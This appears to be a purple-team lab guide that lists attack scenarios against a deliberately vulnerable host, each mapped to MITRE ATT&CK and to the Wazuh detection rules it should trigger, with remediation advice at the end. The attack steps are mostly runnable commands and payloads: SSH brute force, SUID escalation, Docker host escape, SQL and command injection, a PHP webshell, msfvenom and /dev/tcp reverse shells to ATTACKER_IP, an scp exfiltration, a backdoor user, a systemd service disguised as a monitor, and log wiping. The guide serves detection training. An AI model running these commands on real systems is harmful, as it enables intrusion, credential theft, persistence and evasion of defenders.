# Attack Scenarios

This document provides step-by-step attack scenarios to test the Purple Team Lab vulnerabilities. Each scenario is mapped to MITRE ATT&CK techniques and includes detection indicators.

---

## Table of Contents

- [Attack Scenarios](#attack-scenarios)
  - [Table of Contents](#table-of-contents)
  - [Prerequisites](#prerequisites)
    - [Attacker Machine Setup (Kali Linux)](#attacker-machine-setup-kali-linux)
  - [Scenario 1: Initial Access via SSH Brute Force](#scenario-1-initial-access-via-ssh-brute-force)
    - [Attack Steps](#attack-steps)
    - [Expected Detection](#expected-detection)
  - [Scenario 2: Privilege Escalation via SUID Binary](#scenario-2-privilege-escalation-via-suid-binary)
    - [Attack Steps](#attack-steps-1)
    - [Expected Detection](#expected-detection-1)
  - [Scenario 3: Container Escape via Docker API](#scenario-3-container-escape-via-docker-api)
    - [Attack Steps](#attack-steps-2)
    - [Expected Detection](#expected-detection-2)
  - [Scenario 4: Credential Theft from NFS Shares](#scenario-4-credential-theft-from-nfs-shares)
    - [Attack Steps](#attack-steps-3)
    - [Expected Detection](#expected-detection-3)
  - [Scenario 5: Web Application Exploitation](#scenario-5-web-application-exploitation)
    - [Attack Steps](#attack-steps-4)
      - [5A: SQL Injection](#5a-sql-injection)
      - [5B: Command Injection](#5b-command-injection)
      - [5C: File Upload Exploitation](#5c-file-upload-exploitation)
    - [Expected Detection](#expected-detection-4)
  - [Scenario 6: Lateral Movement via FTP](#scenario-6-lateral-movement-via-ftp)
    - [Attack Steps](#attack-steps-5)
    - [Expected Detection](#expected-detection-5)
  - [Scenario 7: Persistence via Cron Jobs](#scenario-7-persistence-via-cron-jobs)
    - [Attack Steps](#attack-steps-6)
    - [Expected Detection](#expected-detection-6)
  - [Scenario 8: Cloud Credential Exfiltration](#scenario-8-cloud-credential-exfiltration)
    - [Attack Steps](#attack-steps-7)
    - [Expected Detection](#expected-detection-7)
  - [Combined Attack Chain](#combined-attack-chain)
  - [Post-Exploitation](#post-exploitation)
    - [Maintaining Access](#maintaining-access)
    - [Covering Tracks](#covering-tracks)
  - [Detection Validation](#detection-validation)
  - [Remediation Guidance](#remediation-guidance)
  - [Responsible Testing](#responsible-testing)

---

## Prerequisites

### Attacker Machine Setup (Kali Linux)

```bash
# Update Kali
sudo apt update

# Install required tools
sudo apt install -y \
    hydra \
    nmap \
    nfs-common \
    ftp \
    smbclient \
    docker.io \
    sqlmap \
    metasploit-framework

# Set target IP variable
export TARGET_IP=<your-vulnlab-ip>
```

---

## Scenario 1: Initial Access via SSH Brute Force

**MITRE ATT&CK:** T1110 (Brute Force), T1078 (Valid Accounts)

### Attack Steps

1. **Reconnaissance - Identify SSH service**
   ```bash
   nmap -sV -p 22 $TARGET_IP
   ```

2. **Create password list**
   ```bash
   cat > passwords.txt <<EOF
   admin
   password
   admin123
   backup
   backup123
   developer
   dev123
   EOF
   ```

3. **Execute brute force attack**
   ```bash
   # Target admin user
   hydra -l admin -P passwords.txt ssh://$TARGET_IP
   
   # Target multiple users
   hydra -L users.txt -P passwords.txt ssh://$TARGET_IP
   ```

4. **Successful login**
   ```bash
   ssh admin@$TARGET_IP
   # Password: admin
   ```

### Expected Detection

**Wazuh Alerts:**
- Rule 100003: Multiple SSH authentication failures
- Rule 100002: Weak user account SSH login

**Log Evidence:**
```
/var/log/auth.log: Multiple "Failed password" entries
/var/ossec/logs/alerts/alerts.log: Wazuh alert triggers
```

---

## Scenario 2: Privilege Escalation via SUID Binary

**MITRE ATT&CK:** T1548 (Abuse Elevation Control Mechanism)

### Attack Steps

1. **Initial access as low-privilege user**
   ```bash
   ssh admin@$TARGET_IP
   ```

2. **Search for SUID binaries**
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```

3. **Identify vulnerable binary**
   ```bash
   ls -la /usr/local/bin/rootbash
   # Output: -rwsr-xr-x 1 root root ... /usr/local/bin/rootbash
   ```

4. **Exploit SUID binary**
   ```bash
   /usr/local/bin/rootbash -p
   whoami  # Should output: root
   id      # uid=1001(admin) euid=0(root)
   ```

5. **Maintain access**
   ```bash
   # Add SSH key for persistence
   mkdir -p /root/.ssh
   echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
   chmod 600 /root/.ssh/authorized_keys
   ```

### Expected Detection

**Wazuh Alerts:**
- Rule 100040: SUID binary execution detected

**Indicators:**
- Execution of /usr/local/bin/rootbash
- Privilege escalation from UID 1001 to EUID 0

---

## Scenario 3: Container Escape via Docker API

**MITRE ATT&CK:** T1611 (Escape to Host)

### Attack Steps

1. **Discover exposed Docker API**
   ```bash
   nmap -p 2375 $TARGET_IP
   curl http://$TARGET_IP:2375/version
   ```

2. **List existing containers**
   ```bash
   docker -H tcp://$TARGET_IP:2375 ps -a
   docker -H tcp://$TARGET_IP:2375 images
   ```

3. **Deploy privileged container with host filesystem**
   ```bash
   docker -H tcp://$TARGET_IP:2375 run -it --rm \
     --privileged \
     --pid=host \
     -v /:/host \
     ubuntu:latest \
     chroot /host /bin/bash
   ```

4. **You're now root on the host system**
   ```bash
   whoami  # root
   hostname  # vulnlab
   cat /etc/shadow
   ```

5. **Establish persistence**
   ```bash
   # Create backdoor user
   useradd -m -s /bin/bash backdoor
   echo "backdoor:Password123" | chpasswd
   usermod -aG sudo backdoor
   ```

### Expected Detection

**Wazuh Alerts:**
- Rule 100010: Docker API access detected
- Rule 100011: Docker container creation via API
- Rule 100012: Privileged Docker container created

**Indicators:**
- HTTP POST to /containers/create
- Container with privileged flag
- Host filesystem mounted in container

---

## Scenario 4: Credential Theft from NFS Shares

**MITRE ATT&CK:** T1039 (Data from Network Shared Drive), T1552 (Unsecured Credentials)

### Attack Steps

1. **Discover NFS shares**
   ```bash
   nmap -p 111,2049 $TARGET_IP
   showmount -e $TARGET_IP
   ```

2. **Mount NFS share**
   ```bash
   sudo mkdir -p /mnt/target-home
   sudo mount -t nfs $TARGET_IP:/home /mnt/target-home
   ```

3. **Enumerate user directories**
   ```bash
   ls -la /mnt/target-home/
   ```

4. **Steal AWS credentials**
   ```bash
   cat /mnt/target-home/developer/.aws/credentials
   ```

5. **Copy SSH keys**
   ```bash
   cp /mnt/target-home/developer/.ssh/id_rsa /tmp/stolen_key
   chmod 600 /tmp/stolen_key
   ```

6. **Access other shares**
   ```bash
   sudo mount -t nfs $TARGET_IP:/srv/nfs/shared /mnt/shared
   cat /mnt/shared/confidential.txt
   ```

### Expected Detection

**Wazuh Alerts:**
- Rule 100020: NFS mount activity detected
- Rule 100021: NFS share accessed
- Rule 100050: AWS credentials file accessed

**Indicators:**
- NFS mount operations in logs
- Access to .aws/credentials
- Unusual file access patterns

---

## Scenario 5: Web Application Exploitation

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application)

### Attack Steps

#### 5A: SQL Injection

1. **Access DVWA**
   ```
   http://$TARGET_IP/DVWA/
   Login: admin / password
   Set Security Level: Low
   ```

2. **Navigate to SQL Injection page**

3. **Test basic injection**
   ```
   User ID: 1' or '1'='1
   ```

4. **Extract database information**
   ```sql
   ' UNION SELECT null, database() #
   ' UNION SELECT null, user() #
   ' UNION SELECT null, version() #
   ```

5. **Dump user table**
   ```sql
   ' UNION SELECT user, password FROM users #
   ```

#### 5B: Command Injection

1. **Navigate to Command Injection page**

2. **Test basic command execution**
   ```
   127.0.0.1; id
   127.0.0.1 && whoami
   ```

3. **Enumerate system**
   ```
   127.0.0.1; cat /etc/passwd
   127.0.0.1; ls -la /home
   ```

4. **Establish reverse shell**
   ```bash
   # On attacker machine - set up listener
   nc -lvnp 4444
   
   # In DVWA command injection
   127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
   ```

#### 5C: File Upload Exploitation

1. **Navigate to File Upload page**

2. **Create PHP webshell**
   ```bash
   cat > shell.php <<'EOF'
   <?php system($_GET['cmd']); ?>
   EOF
   ```

3. **Upload webshell**
   - Upload shell.php through DVWA interface

4. **Execute commands via webshell**
   ```
   http://$TARGET_IP/DVWA/hackable/uploads/shell.php?cmd=id
   http://$TARGET_IP/DVWA/hackable/uploads/shell.php?cmd=cat+/etc/passwd
   ```

### Expected Detection

**Wazuh Alerts:**
- Rule 100071: SQL injection attempt
- Rule 100072: Command injection attempt
- Rule 100073: File upload detected

**Indicators:**
- Suspicious SQL patterns in access logs
- Shell metacharacters in POST data
- PHP file uploads to DVWA directory

---

## Scenario 6: Lateral Movement via FTP

**MITRE ATT&CK:** T1021.002 (Remote Services: SMB/Windows Admin Shares)

### Attack Steps

1. **Test anonymous FTP access**
   ```bash
   ftp $TARGET_IP
   # Username: anonymous
   # Password: (press enter)
   ```

2. **Enumerate FTP directory**
   ```
   ftp> ls
   ftp> cd upload
   ftp> ls
   ```

3. **Upload malicious file**
   ```bash
   # Create payload on attacker machine
   msfvenom -p linux/x64/shell_reverse_tcp \
     LHOST=ATTACKER_IP LPORT=4444 \
     -f elf > payload.elf
   
   # Upload via FTP
   ftp> binary
   ftp> put payload.elf
   ```

4. **Combine with other vulnerabilities**
   ```bash
   # SSH as admin user
   ssh admin@$TARGET_IP
   
   # Access uploaded payload via FTP directory
   chmod +x /srv/ftp/upload/payload.elf
   ./srv/ftp/upload/payload.elf
   ```

### Expected Detection

**Wazuh Alerts:**
- Rule 100030: FTP anonymous login
- Rule 100031: Anonymous FTP file upload

**Indicators:**
- Anonymous FTP connection
- File upload to FTP directory
- Executable file creation

---

## Scenario 7: Persistence via Cron Jobs

**MITRE ATT&CK:** T1053.003 (Scheduled Task/Job: Cron)

### Attack Steps

1. **SSH as compromised user**
   ```bash
   ssh admin@$TARGET_IP
   ```

2. **Identify world-writable cron script**
   ```bash
   find /usr/local/bin -perm -002 -type f
   ls -la /usr/local/bin/backup.sh
   ```

3. **Inject malicious code**
   ```bash
   cat >> /usr/local/bin/backup.sh <<'EOF'
   
   # Persistence backdoor
   bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1
   EOF
   ```

4. **Wait for cron execution (runs every 5 minutes)**
   ```bash
   # On attacker machine
   nc -lvnp 5555
   ```

5. **Alternative: Add own cron job**
   ```bash
   (crontab -l 2>/dev/null; echo "*/10 * * * * /tmp/backdoor.sh") | crontab -
   ```

### Expected Detection

**Wazuh Alerts:**
- Rule 100060: World-writable cron script executed
- Rule 100061: Crontab modified

**Indicators:**
- Modification of /usr/local/bin/backup.sh
- Unusual network connections from cron
- Crontab changes

---

## Scenario 8: Cloud Credential Exfiltration

**MITRE ATT&CK:** T1552.001 (Unsecured Credentials: Credentials In Files)

### Attack Steps

1. **Initial access**
   ```bash
   ssh developer@$TARGET_IP
   # Password: dev123
   ```

2. **Search for AWS credentials**
   ```bash
   # Check standard AWS CLI location
   cat ~/.aws/credentials
   
   # Search for AWS keys in common locations
   grep -r "AKIA" /home/developer 2>/dev/null
   grep -r "aws_access_key_id" /home/developer 2>/dev/null
   ```

3. **Find credentials in web application**
   ```bash
   cat /var/www/html/app/config.php
   ```

4. **Exfiltrate credentials**
   ```bash
   # Copy to attacker machine
   scp developer@$TARGET_IP:~/.aws/credentials ./stolen_creds
   
   # Or via NFS (if mounted)
   cp ~/.aws/credentials /srv/nfs/shared/
   ```

5. **Test stolen credentials**
   ```bash
   # On attacker machine
   export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
   export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
   
   # Attempt AWS API calls (will fail - fake creds)
   aws sts get-caller-identity
   ```

### Expected Detection

**Wazuh Alerts:**
- Rule 100050: AWS credentials file accessed
- Rule 100051: Web application config file accessed

**Indicators:**
- Access to .aws/credentials
- Reading of config.php
- File exfiltration via SCP/NFS

---

## Combined Attack Chain

**Full Kill Chain Demonstration:**

```bash
# 1. Initial Access (T1110)
hydra -l admin -p admin ssh://$TARGET_IP
ssh admin@$TARGET_IP

# 2. Discovery (T1087)
cat /etc/passwd
ls -la /home

# 3. Privilege Escalation (T1548)
/usr/local/bin/rootbash -p

# 4. Credential Access (T1552)
cat /home/developer/.aws/credentials

# 5. Persistence (T1053)
echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab

# 6. Container Escape (T1611)
docker -H tcp://$TARGET_IP:2375 run --privileged -v /:/host ubuntu chroot /host

# 7. Exfiltration (T1048)
scp /etc/shadow attacker@ATTACKER_IP:/tmp/
```

---

## Post-Exploitation

### Maintaining Access

```bash
# Add SSH key
mkdir -p ~/.ssh
echo "ssh-rsa YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys

# Create backdoor user
useradd -m backdoor
echo "backdoor:ComplexPass123!" | chpasswd
usermod -aG sudo backdoor

# Install persistent reverse shell
cat > /etc/systemd/system/backdoor.service <<EOF
[Unit]
Description=System Monitor Service

[Service]
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1; sleep 60; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service
```

### Covering Tracks

```bash
# Clear bash history
history -c
rm ~/.bash_history

# Clear system logs
> /var/log/auth.log
> /var/log/syslog

# Remove uploaded files
rm /srv/ftp/upload/*
rm /tmp/*.elf
```

---

## Detection Validation

After each attack scenario, verify detection in Wazuh:

1. **Access Wazuh Dashboard**
   ```
   https://YOUR_WAZUH_MANAGER:443
   ```

2. **Check Security Events**
   - Navigate to Security Events
   - Filter by agent: vulnlab
   - Look for corresponding rule IDs

3. **Review MITRE ATT&CK Dashboard**
   - Check which techniques were detected
   - Verify alert severity levels
   - Review timeline of events

4. **Analyze Logs**
   ```bash
   # On Wazuh Manager
   tail -f /var/ossec/logs/alerts/alerts.log
   grep "vulnlab" /var/ossec/logs/alerts/alerts.log
   ```

---

## Remediation Guidance

For each vulnerability:

1. **SSH Hardening**
   - Disable root login
   - Disable password authentication
   - Use SSH keys only
   - Implement fail2ban

2. **Docker Security**
   - Remove exposed API
   - Use TLS authentication
   - Implement least privilege
   - Network segmentation

3. **Credential Management**
   - Use secrets management (HashiCorp Vault)
   - Encrypt sensitive files
   - Implement proper file permissions
   - Regular credential rotation

4. **Web Application Security**
   - Update DVWA to secure settings
   - Implement WAF
   - Input validation
   - Output encoding

---

## Responsible Testing

**Remember:**
- Only test on YOUR OWN lab environment
- Document all activities
- Notify your team before testing
- Have rollback plans ready
- Monitor for unintended impacts

**This lab is for educational purposes only. Unauthorized access to computer systems is illegal.**